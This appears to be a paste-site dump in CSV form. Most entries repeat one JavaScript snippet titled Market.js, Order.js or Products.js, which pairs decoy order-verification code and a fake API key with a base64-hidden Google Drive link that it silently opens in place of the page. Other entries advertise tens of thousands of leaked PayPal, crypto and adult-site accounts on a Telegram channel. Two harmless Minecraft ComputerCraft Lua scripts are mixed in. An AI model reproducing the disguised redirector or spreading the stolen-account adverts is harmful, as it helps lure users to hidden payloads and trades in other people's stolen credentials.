id,title,username,language,date,content
Gb3Uakjp,Market.js,dentira,JavaScript,Monday 28th of April 2025 05:46:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45918/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pTMxh1n2,Crypto Accounts,Epiphemeral,JavaScript,Monday 28th of April 2025 05:44:06 PM CDT,75988 Accounts Posted On https://t.me/leakzbyeminem
Ak0UTsXQ,Untitled,dentira,JavaScript,Monday 28th of April 2025 05:31:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31261/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8aVmhjSB,PayPal with Balance,Epiphemeral,JavaScript,Monday 28th of April 2025 05:28:44 PM CDT,91998 Accounts Posted On https://t.me/leakzbyeminem
itrUwdmZ,Products.js,dentira,JavaScript,Monday 28th of April 2025 05:16:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02834/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
u65mWd0H,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Monday 28th of April 2025 05:13:22 PM CDT,03252 Accounts Posted On https://t.me/leakzbyeminem
ZL84pXvX,Order.js,dentira,JavaScript,Monday 28th of April 2025 05:00:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76851/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Gp73j3pw,Chaturbate with Tokens,Epiphemeral,JavaScript,Monday 28th of April 2025 04:58:00 PM CDT,44541 Accounts Posted On https://t.me/leakzbyeminem
Tj4T9caL,Market.js,dentira,JavaScript,Monday 28th of April 2025 04:44:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64967/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Q7cJfqmq,Crypto Accounts,Epiphemeral,JavaScript,Monday 28th of April 2025 04:42:39 PM CDT,86319 Accounts Posted On https://t.me/leakzbyeminem
h2bnQgcY,ae2-monitor v3,DubSlime,Lua,Monday 28th of April 2025 04:28:57 PM CDT,"-- AE2 Monitor Deluxe Edition
-- Light Theme + Crafting + Storage Recap + Sorted Items + Popup Details
-- By ChatGPT

-- Find peripherals
local monitor = peripheral.find(""monitor"")
local me = peripheral.find(""meBridge"")

if not monitor then error(""No monitor connected!"") end
if not me then error(""No ME Bridge connected!"") end

-- SETTINGS
monitor.setTextScale(0.5)
local w, h = monitor.getSize()
local itemsPerPage = h - 8
local pageCrafting = 1
local pageStorage = 1
local activeTab = ""crafting""
local blinkState = true
local selectedItem = nil
local history = {}

-- COLORS
local bgColor = colors.white
local textColor = colors.black
local tabActive = colors.lightBlue
local tabInactive = colors.gray
local footerColor = colors.lightGray
local busyColor = colors.blue
local overloadedColor = colors.red
local idleColor = colors.green
local popupColor = colors.orange

-- UTILITIES
local function centerText(text, y, textCol, bgCol)
    monitor.setCursorPos(math.floor((w - #text) / 2) + 1, y)
    monitor.setTextColor(textCol or textColor)
    monitor.setBackgroundColor(bgCol or bgColor)
    monitor.write(text)
end

local function drawBlock(x1, y1, x2, y2, bg)
    monitor.setBackgroundColor(bg)
    for y = y1, y2 do
        monitor.setCursorPos(x1, y)
        monitor.write(string.rep("" "", x2 - x1 + 1))
    end
end

local function drawButton(x1, x2, label, enabled)
    monitor.setBackgroundColor(enabled and colors.lightBlue or colors.gray)
    local mid = math.floor((x1 + x2) / 2) - math.floor(#label / 2)
    monitor.setCursorPos(mid, h)
    monitor.setTextColor(colors.black)
    monitor.write(label)
end

local function drawTabs()
    local half = math.floor(w / 2)
    drawBlock(1, 1, w, 2, footerColor)

    drawBlock(1, 1, half, 2, activeTab == ""crafting"" and tabActive or tabInactive)
    centerText(""Crafting"", 1, colors.white, activeTab == ""crafting"" and tabActive or tabInactive)

    drawBlock(half + 1, 1, w, 2, activeTab == ""storage"" and tabActive or tabInactive)
    monitor.setCursorPos(half + math.floor((half - 7) / 2), 1)
    monitor.setTextColor(colors.white)
    monitor.write(""Storage"")
end

local function drawProgressBar(x, y, width, percentage, fgColor, bgColor)
    local fillWidth = math.floor(width * percentage + 0.5)
    monitor.setCursorPos(x, y)
    monitor.setBackgroundColor(fgColor)
    monitor.write(string.rep("" "", fillWidth))
    monitor.setBackgroundColor(bgColor)
    monitor.write(string.rep("" "", width - fillWidth))
end

local function drawCraftingTab()
    monitor.setBackgroundColor(bgColor)
    monitor.clear()
    drawTabs()
    centerText(""Ongoing Crafting Jobs"", 4, textColor, bgColor)

    local cpus = me.getCraftingCPUs() or {}
    local totalPages = math.max(1, math.ceil(#cpus / itemsPerPage))
    pageCrafting = math.min(pageCrafting, totalPages)

    local startIdx = (pageCrafting - 1) * itemsPerPage + 1
    local endIdx = math.min(#cpus, startIdx + itemsPerPage - 1)

    local y = 6
    for idx = startIdx, endIdx do
        local cpu = cpus[idx]
        if cpu then
            local name = cpu.name or (""CPU #"" .. idx)
            if name == """" then name = ""Unnamed CPU"" end
            local busy = cpu.isBusy

            local cpuColor = idleColor
            if busy then
                cpuColor = blinkState and busyColor or overloadedColor
            end

            drawBlock(2, y, w - 1, y + 2, footerColor)
            monitor.setCursorPos(4, y + 1)
            monitor.setTextColor(textColor)
            monitor.write(name:sub(1, w - 15))

            local usage = busy and 0.6 or 0.1
            monitor.setCursorPos(w - 15, y + 1)
            drawProgressBar(w - 15, y + 1, 13, usage, cpuColor, colors.gray)

            y = y + 4
        end
    end

    drawBlock(1, h, w, h, footerColor)
    drawButton(1, math.floor(w / 2) - 1, ""< Prev"", pageCrafting > 1)
    drawButton(math.floor(w / 2) + 1, w, ""Next >"", pageCrafting < totalPages)
    centerText(""Page "" .. pageCrafting .. ""/"" .. totalPages, h - 1, textColor, footerColor)
end

local function sortByAmountDesc(a, b)
    return (a.amount or 0) > (b.amount or 0)
end

local storageCache = {}

local function drawStorageTab()
    monitor.setBackgroundColor(bgColor)
    monitor.clear()
    drawTabs()
    centerText(""Storage Overview"", 4, textColor, bgColor)

    storageCache = me.listItems() or {}
    table.sort(storageCache, sortByAmountDesc)

    local totalPages = math.max(1, math.ceil(#storageCache / itemsPerPage))
    pageStorage = math.min(pageStorage, totalPages)

    local startIdx = (pageStorage - 1) * itemsPerPage + 1
    local endIdx = math.min(#storageCache, startIdx + itemsPerPage - 1)

    local y = 6
    for idx = startIdx, endIdx do
        local item = storageCache[idx]
        local name = item.displayName or ""Unknown""
        local amount = item.amount or 0

        if idx - startIdx < 5 then
            drawBlock(2, y, w - 1, y, colors.lightBlue)
            monitor.setTextColor(colors.white)
        else
            monitor.setBackgroundColor(bgColor)
            monitor.setTextColor(textColor)
        end

        monitor.setCursorPos(3, y)
        monitor.write(name:sub(1, 20))

        monitor.setCursorPos(w - 10, y)
        monitor.write(""x"" .. amount)

        y = y + 1
    end

    drawBlock(1, h, w, h, footerColor)
    drawButton(1, math.floor(w / 2) - 1, ""< Prev"", pageStorage > 1)
    drawButton(math.floor(w / 2) + 1, w, ""Next >"", pageStorage < totalPages)
    centerText(""Page "" .. pageStorage .. ""/"" .. totalPages, h - 1, textColor, footerColor)
end

local function drawPopup()
    if not selectedItem then return end

    local winW = math.floor(w * 0.7)
    local winH = math.floor(h * 0.7)
    local startX = math.floor((w - winW) / 2)
    local startY = math.floor((h - winH) / 2)

    drawBlock(startX, startY, startX + winW, startY + winH, popupColor)
    monitor.setTextColor(textColor)

    monitor.setCursorPos(startX + 2, startY + 1)
    monitor.write(""Item: "" .. (selectedItem.displayName or ""Unknown""))

    monitor.setCursorPos(startX + 2, startY + 2)
    monitor.write(""Stored: "" .. (selectedItem.amount or 0))

    monitor.setCursorPos(startX + 2, startY + 3)
    monitor.write(""Live Trend:"")

    -- Tiny Graph
    local graphWidth = winW - 4
    local graphStartX = startX + 2
    local graphStartY = startY + 5
    local graphHeight = 5

    local maxVal = 1
    for _, v in ipairs(history) do
        if v > maxVal then maxVal = v end
    end

    for i = 1, math.min(graphWidth, #history) do
        local val = history[#history - i + 1] or 0
        local height = math.floor((val / maxVal) * graphHeight)

        for j = 0, height - 1 do
            monitor.setCursorPos(graphStartX + graphWidth - i, graphStartY + graphHeight - j)
            monitor.write(""."")
        end
    end

    monitor.setCursorPos(startX + math.floor(winW / 2) - 3, startY + winH - 1)
    monitor.write(""[ Close ]"")
end

local function handleTouch(x, y)
    x = tonumber(x)
    if not x then return end

    if selectedItem then
        selectedItem = nil
        history = {}
        return
    end

    local half = math.floor(w / 2)
    if y <= 2 then
        if x <= half then
            activeTab = ""crafting""
            pageCrafting = 1
        else
            activeTab = ""storage""
            pageStorage = 1
        end
    elseif y == h then
        if activeTab == ""crafting"" then
            local cpus = me.getCraftingCPUs() or {}
            if x < w / 2 and pageCrafting > 1 then
                pageCrafting = pageCrafting - 1
            elseif x >= w / 2 and pageCrafting < math.ceil(#cpus / itemsPerPage) then
                pageCrafting = pageCrafting + 1
            end
        elseif activeTab == ""storage"" then
            local storage = me.listItems() or {}
            if x < w / 2 and pageStorage > 1 then
                pageStorage = pageStorage - 1
            elseif x >= w / 2 and pageStorage < math.ceil(#storage / itemsPerPage) then
                pageStorage = pageStorage + 1
            end
        end
    elseif activeTab == ""storage"" and y >= 6 and y <= h - 2 then
        local idx = (y - 6) + (pageStorage - 1) * itemsPerPage + 1
        if storageCache[idx] then
            selectedItem = storageCache[idx]
            history = {selectedItem.amount or 0}
        end
    end
end

local function updateHistory()
    if selectedItem then
        local fresh = me.getItem({name = selectedItem.name})
        if fresh then
            table.insert(history, fresh.amount or 0)
            if #history > 100 then
                table.remove(history, 1)
            end
            selectedItem.amount = fresh.amount
        end
    end
end

-- MAIN LOOP
parallel.waitForAny(
    function()
        while true do
            blinkState = not blinkState
            if activeTab == ""crafting"" then
                drawCraftingTab()
            elseif activeTab == ""storage"" then
                drawStorageTab()
            end
            drawPopup()
            sleep(0.5)
            updateHistory()
        end
    end,
    function()
        while true do
            local _, side, x, y = os.pullEvent(""monitor_touch"")
            handleTouch(x, y)
        end
    end
)
"
Txxr1L7a,Untitled,dentira,JavaScript,Monday 28th of April 2025 04:28:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70451/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iWBzpiqw,PayPal with Balance,Epiphemeral,JavaScript,Monday 28th of April 2025 04:27:17 PM CDT,46717 Accounts Posted On https://t.me/leakzbyeminem
bNMihWHY,Products.js,dentira,JavaScript,Monday 28th of April 2025 04:13:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77268/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XaMgGqW7,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Monday 28th of April 2025 04:11:55 PM CDT,60277 Accounts Posted On https://t.me/leakzbyeminem
6JhdMfzr,CC: Wither Status,LoaderB0T,Lua,Monday 28th of April 2025 04:03:30 PM CDT,"-- ComputerCraft
-- Writes text to a minecraft create display based on redstone inputs
print(""Starting Display"")

-- Set up the display
local display = peripheral.wrap(""top"") -- Wrap the display on top of the computer
if not display then
    print(""No display found"")
    return
end

display.clear() -- Clear the display
display.setCursorPos(1, 1) -- Set the cursor position to the top left corner
display.write(""Display ready!"") -- Write a message to the display
display.update() -- Update the display to show the message

-- Wait for 4 seconds before clearing the display
os.sleep(4)
display.clear() -- Clear the display
display.update() -- Update the display to show the cleared screen

local previous_state = nil -- Variable to store the previous state

while true do
    local active_hostile = redstone.getInput(""back"")
    local active_neutral = redstone.getInput(""front"")
    local active_spawnDelay = redstone.getInput(""right"")
    local active_chicken = redstone.getInput(""bottom"")
    local active_missing = redstone.getInput(""left"")

    -- log the states to the console

    print(""Hostile: "" .. tostring(active_hostile))
    print(""Neutral: "" .. tostring(active_neutral))
    print(""Spawn Delay: "" .. tostring(active_spawnDelay))
    print(""Chicken: "" .. tostring(active_chicken))
    print(""Missing: "" .. tostring(active_missing))

    local state_spawning = active_spawnDelay
    local state_chicken = active_chicken
    local state_killing = active_hostile and not active_spawnDelay and not active_chicken
    local state_clearing = active_neutral and not state_killing and not state_chicken
    local state_missing = active_missing
    local state_idle = not state_spawning and not state_killing and not state_clearing and not state_missing and
                           not state_chicken

    local current_state = nil -- Variable to store the current state
    if state_spawning then
        current_state = ""Spawning Wither""
    elseif state_killing then
        current_state = ""Killing Wither""
    elseif state_chicken then
        current_state = ""Deploying Chicken""
    elseif state_clearing then
        current_state = ""Clearing Chamber""
    elseif state_missing then
        current_state = ""Missing Resources""
    elseif state_idle then
        current_state = ""Idle...""
    end

    if current_state == previous_state then
        -- If the state hasn't changed, skip the display update
        print(""State hasn't changed, skipping display update"")
        os.sleep(1) -- Sleep for 1 second before checking the states again
        goto continue -- Skip to the next iteration of the loop
    end
    previous_state = current_state -- Update the previous state
    print(""State changed to: "" .. current_state) -- Log the state change to the console

    -- Display the states on the screen
    display.clear() -- Clear the display
    display.setCursorPos(1, 1) -- Set the cursor position to the top left corner
    display.write(""State:"") -- Write a message to the display
    display.setCursorPos(1, 2) -- Move the cursor to the next line
    display.write(current_state) -- Write the current state to the display
    display.update() -- Update the display to show the current state

    -- Sleep for 1 second before checking the states again
    os.sleep(1)

    ::continue:: -- Label to skip to the next iteration of the loop
end
"
wirctk7t,Order.js,dentira,JavaScript,Monday 28th of April 2025 03:58:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81848/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
snVtkxN7,Chaturbate with Tokens,Epiphemeral,JavaScript,Monday 28th of April 2025 03:56:33 PM CDT,20545 Accounts Posted On https://t.me/leakzbyeminem
YMkrx2aQ,Market.js,dentira,JavaScript,Monday 28th of April 2025 03:42:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05225/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
D9VbgNZm,Crypto Accounts,Epiphemeral,JavaScript,Monday 28th of April 2025 03:41:12 PM CDT,37218 Accounts Posted On https://t.me/leakzbyeminem
yJG9AF0z,Untitled,dentira,JavaScript,Monday 28th of April 2025 03:27:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70698/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7yvEtqsg,PayPal with Balance,Epiphemeral,JavaScript,Monday 28th of April 2025 03:25:39 PM CDT,54538 Accounts Posted On https://t.me/leakzbyeminem
vsHz2WvX,Products.js,Epiphemeral,JavaScript,Monday 28th of April 2025 03:11:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48981/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
